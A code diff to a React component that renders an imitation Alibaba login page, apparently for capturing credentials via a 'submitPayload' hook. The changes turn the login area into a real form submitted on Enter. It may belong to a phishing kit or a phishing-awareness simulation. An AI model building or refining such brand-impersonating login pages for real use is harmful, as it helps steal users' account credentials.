@@ -22,7 +22,8 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { reportViolation, submitPayload, error, setError } = useSecurity();
 
-  const handleSubmit = async () => {
+  const handleSubmit = async (e?: React.FormEvent) => {
+    if (e) e.preventDefault();
     if (!agreed) {
       alert(lang === 'zh' ? '请先勾选同意协议' : 'Please agree with the policies');
       return;
@@ -108,7 +109,7 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
                 placeholder="输入邮箱地址" 
                 className="flex-grow px-4 py-3 outline-none text-sm text-gray-600"
               />
-              <button className="px-6 py-3 bg-[#f54c3e] text-white text-sm font-bold flex items-center space-x-2 hover:bg-[#d43d31] transition-colors">
+              <button type="button" className="px-6 py-3 bg-[#f54c3e] text-white text-sm font-bold flex items-center space-x-2 hover:bg-[#d43d31] transition-colors">
                 <span>立即订阅</span>
                 <span className="text-xs">🔔</span>
               </button>
@@ -127,6 +128,7 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
               {/* Tabs */}
               <div className="flex border-b border-[#f0f3f7]">
                 <button 
+                  type="button"
                   onClick={() => setActiveTab('account')}
                   className={`flex-1 py-5 text-[15px] font-medium transition-all relative ${activeTab === 'account' ? 'text-gray-900' : 'text-gray-400'}`}
                 >
@@ -134,6 +136,7 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
                   {activeTab === 'account' && <div className="absolute bottom-0 left-1/2 -translate-x-1/2 w-10 h-[2.5px] bg-gray-800"></div>}
                 </button>
                 <button 
+                  type="button"
                   onClick={() => setActiveTab('dingtalk')}
                   className={`flex-1 py-5 text-[15px] font-medium transition-all relative ${activeTab === 'dingtalk' ? 'text-gray-900' : 'text-gray-400'}`}
                 >
@@ -143,7 +146,7 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
               </div>
 
               {/* Form Content */}
-              <div className="p-8 space-y-6">
+              <form onSubmit={handleSubmit} className="p-8 space-y-6">
                 <div className="space-y-4">
                   <div className="relative">
                     <input 
@@ -187,7 +190,7 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
                 </div>
 
                 <button 
-                  onClick={handleSubmit}
+                  type="submit"
                   disabled={isSubmitting}
                   className="w-full py-3.5 bg-[#f54c3e] hover:bg-[#d43d31] text-white font-bold rounded transition-all text-[16px] shadow-lg shadow-red-100 uppercase tracking-wide disabled:opacity-70"
                 >
@@ -216,7 +219,7 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
                     I have read and agree with <a href="#" className="text-blue-500">Privacy Policy</a>, <a href="#" className="text-blue-500">Product Service Agreement</a>
                   </label>
                 </div>
-              </div>
+              </form>
 
               {/* Bottom Quick Switch */}
               <div className="bg-[#fcfdfe] border-t border-[#f0f3f7] py-4 flex items-center justify-center space-x-2 group cursor-pointer hover:bg-white transition-all">
